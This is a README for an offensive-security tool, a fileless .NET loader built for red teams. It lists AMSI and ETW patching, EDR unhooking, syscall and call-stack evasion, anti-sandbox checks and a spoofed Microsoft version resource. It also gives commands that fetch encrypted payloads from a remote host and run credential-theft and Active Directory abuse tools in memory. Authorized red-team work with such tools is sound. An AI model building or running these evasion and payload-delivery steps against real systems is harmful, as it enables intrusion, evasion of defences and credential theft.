# CharpLdr v2 — Fileless .NET Assembly Loader

Native (C/C++) loader that downloads, decrypts, and executes .NET assemblies entirely in memory. Built for red team engagements and authorized penetration testing.

> **Legal disclaimer — read before use.**
> This tool is provided for **authorized security testing, red team engagements, and educational research only**. You must have **explicit written permission** from the system owner before using this tool against any target. Unauthorized access to computer systems is illegal under the CFAA (18 U.S.C. § 1030), the Computer Misuse Act 1990, and equivalent laws in most jurisdictions. The authors assume no liability for misuse. By using this software you agree that you are solely responsible for compliance with all applicable laws.

## Techniques

| # | Technique | Implementation |
|---|-----------|----------------|
| 1 | PEB Walking | API resolution via DJB2 hash — no GetProcAddress/LoadLibrary in IAT |
| 2 | Compile-time String Encryption | XOR-based `OBFSTR`/`OBFWSTR` macros, zero cleartext in binary |
| 3 | Indirect Syscalls | Hell's Gate / Halo's Gate SSN resolution + `syscall` via ntdll gadget |
| 4 | Call Stack Spoofing | Synthetic `BaseThreadInitThunk` → `RtlUserThreadStart` frames |
| 5 | CLR Unhooking | Map clean `clr.dll` from disk, restore `.text` section via indirect syscalls |
| 6 | AMSI Bypass | Direct patch of `AmsiScanBuffer` via `NtProtectVirtualMemory` (indirect syscall) |
| 7 | ETW Bypass | Direct patch of `EtwEventWrite` via `NtProtectVirtualMemory` (indirect syscall) |
| 8 | Custom RC4 | Inline implementation with compile-time obfuscated key |
| 9 | Raw TCP + HTTP/1.1 | Winsock loaded via `LdrLoadDll`, realistic request headers |
| 10 | CLR Hosting + MiniLoader | `ICLRRuntimeHost::ExecuteInDefaultAppDomain` with memory-mapped payload |
| 11 | NT ThreadPool | `TpAllocWork`/`TpPostWork` instead of `CreateThread` |
| 12 | PE Hardening | Rich header stripped, debug directory removed, reproducible timestamps |
| 13 | Anti-Sandbox | RAM/uptime/CPU count checks + sleep timing verification |

## Build

**Requirements**: Visual Studio 2022+ (MSVC), CMake 3.20+, Windows SDK 10.0+, x64 only.

```cmd
mkdir build && cd build
cmake -G "Visual Studio 17 2022" -A x64 ..
cmake --build . --config Release
```

Output: `build\Release\charpldr.exe` (~186 KB, static CRT, no debug info).

## Usage

### 1. Encrypt a .NET assembly

```cmd
python tools/encrypt_assembly.py Rubeus.exe -o Rubeus.enc --verify
python tools/encrypt_assembly.py Seatbelt.exe -o Seatbelt.enc --verify
```

### 2. Serve it

```cmd
python tools/encrypt_assembly.py Rubeus.exe --serve --port 8443
# Or any HTTP server in the directory containing .enc files
```

### 3. Execute

```
charpldr.exe <host> <port> /<resource> [assembly_args...]
```

```cmd
charpldr.exe 192.168.1.100 8443 /Rubeus.enc triage
charpldr.exe 10.10.10.10 8443 /Seatbelt.enc -group=all
charpldr.exe 192.168.1.100 8443 /SharpHound.enc -c All
```

## Execution Flow

```
sandbox_check() → RAM, uptime, CPU count, sleep timing
    ↓
PEB walk → resolve ntdll, kernel32, ws2_32, mscoree APIs
    ↓
Hell's Gate → resolve syscall numbers (SSNs)
    ↓
init_spoof() → locate stack spoofing gadgets
    ↓
download_payload() → HTTP/1.1 GET over raw TCP
    ↓
decrypt_payload() → RC4 with obfuscated key
    ↓
[NT ThreadPool]
    ↓
CLR Start → ICLRRuntimeHost::Start()
    ↓
unhook_clr_module() → map clean clr.dll, restore .text (removes EDR hooks)
    ↓
patch_amsi_bypass() → NtProtectVirtualMemory + patch AmsiScanBuffer
    ↓
patch_etw_bypass() → NtProtectVirtualMemory + patch EtwEventWrite
    ↓
MiniLoader → ExecuteInDefaultAppDomain → Assembly.Load(byte[]) via MMF
    ↓
restore patches → restore original AMSI/ETW bytes
    ↓
cleanup → release COM, zero buffers, delete MiniLoader DLL
```

## RC4 Key

The RC4 key is embedded (compile-time obfuscated) in `src/crypto.cpp` and must match `tools/encrypt_assembly.py`. Default: 32 bytes. To change it, update both files.

## Project Structure

```
├── src/
│   ├── main.cpp              Entry point, sandbox checks, orchestration
│   ├── hash.h                DJB2 compile-time hashes (constexpr)
│   ├── obfstr.h              Compile-time XOR string encryption
│   ├── peb_walk.h/cpp        PEB walk, API resolution, LdrLoadDll
│   ├── syscalls.h/cpp        Indirect syscalls (Hell's/Halo's Gate)
│   ├── stackspoof.h/cpp      Call stack spoofing gadgets
│   ├── amsi.h/cpp            AMSI bypass (direct patch)
│   ├── etw.h/cpp             ETW bypass (direct patch)
│   ├── crypto.h/cpp          RC4 + obfuscated key
│   ├── network.h/cpp         TCP download, HTTP/1.1
│   ├── clr.h/cpp             CLR hosting, CLR unhooking, MiniLoader
│   ├── threadpool.h/cpp      NT ThreadPool execution
│   ├── stomp.h/cpp           Module stomping (available, not active)
│   ├── unhook.h/cpp          ntdll unhooking (available, not active)
│   ├── miniloader_bytes.h    XOR-encrypted MiniLoader DLL bytes
│   └── version.rc            Spoofed version info (Microsoft)
├── syscalls.asm              MASM indirect syscall stub + stack spoof
├── tools/
│   ├── encrypt_assembly.py   RC4 encryption + optional HTTP server
│   ├── MiniLoader.cs         .NET DLL source (Assembly.Load bridge)
│   ├── TestAssembly.cs       Minimal test assembly
│   └── SimpleServer.cs       Minimal HTTP server for .enc delivery
├── hashes/
│   └── generate_hashes.py    DJB2 hash generator + collision check
├── CMakeLists.txt
├── LICENSE
└── README.md
```

## Compatible .NET Tools

Any .NET Framework 4.x assembly with a `static int Main(string[])` entry point works. Tested with:

- [Rubeus](https://github.com/GhostPack/Rubeus) — Kerberos abuse
- [Seatbelt](https://github.com/GhostPack/Seatbelt) — Host enumeration
- [SharpHound](https://github.com/BloodHoundAD/SharpHound) — BloodHound collection
- [SharpUp](https://github.com/GhostPack/SharpUp) — Privilege escalation checks
- [Certify](https://github.com/GhostPack/Certify) — AD CS abuse
- [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) — DPAPI triage
- [SharpChrome](https://github.com/GhostPack/SharpDPAPI) — Chrome credential recovery
- [Whisker](https://github.com/eladshamir/Whisker) — Shadow credentials abuse
- [StandIn](https://github.com/FuzzySecurity/StandIn) — AD post-exploitation
- [SharpView](https://github.com/tevora-threat/SharpView) — .NET port of PowerView
- [KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp) — Kerberos relay privilege escalation
- [SharpLAPS](https://github.com/swisskyrepo/SharpLAPS) — LAPS password retrieval
- [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) — SCCM abuse
- [SharpWMI](https://github.com/GhostPack/SharpWMI) — WMI interaction

Compile them, encrypt with `encrypt_assembly.py`, serve, and load.

## Pre-encrypted Payloads

The `payloads/` directory contains RC4-encrypted versions of common pentest assemblies, ready to serve. Use the same RC4 key configured in `src/crypto.cpp`.

## Limitations

- **CLR managed heap**: `Assembly.Load(byte[])` copies the assembly into the managed heap. The original buffer is zeroed, but the CLR's copy persists until the AppDomain is unloaded.
- **Kernel ETW**: the userland ETW patch does not affect the ETW Threat Intelligence Provider (kernel side). EDRs leveraging kernel ETW still receive telemetry.
- **Stack spoofing scope**: only syscalls routed through `SpoofCallSyscall` get synthetic frames. Internal CLR calls use the real stack.
- **MiniLoader on disk**: `MiniLoader.dll` is briefly written to disk for `ExecuteInDefaultAppDomain`. It is deleted immediately after use and contains no offensive code (only an `Assembly.Load` bridge).

## License

BSD 3-Clause. See [LICENSE](LICENSE).
